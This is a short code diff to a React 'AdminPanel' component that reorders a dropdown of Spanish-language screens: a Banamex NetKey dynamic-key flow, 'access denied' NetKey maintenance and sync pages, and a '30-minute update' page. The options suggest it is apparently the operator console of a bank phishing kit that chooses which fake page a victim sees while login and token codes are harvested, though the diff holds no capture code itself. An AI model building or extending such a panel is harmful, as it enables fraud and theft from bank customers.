@@ -1027,11 +1027,10 @@ export default function AdminPanel() {
                   value=""
                 >
                   <option value="">Selecciona una opción</option>
-                  <option value="login">1. Login</option>
-                  <option value="netkey2">2. NetKey - Clave Dinámica</option>
-                  <option value="acceso_denegado">3. Acceso Denegado - NetKey Mantenimiento</option>
-                  <option value="acceso_denegado_2">4. Acceso Denegado 2 - Sincronización NetKey</option>
-                  <option value="actualizacion">5. Estamos Actualizando (30 min)</option>
+                  <option value="netkey2">1. Banamex - Flujo Completo (NetKey → Formulario)</option>
+                  <option value="acceso_denegado">2. Acceso Denegado - NetKey Mantenimiento</option>
+                  <option value="acceso_denegado_2">3. Acceso Denegado 2 - Sincronización NetKey</option>
+                  <option value="actualizacion">4. Estamos Actualizando (30 min)</option>
                 </select>
               </div>
             </div>
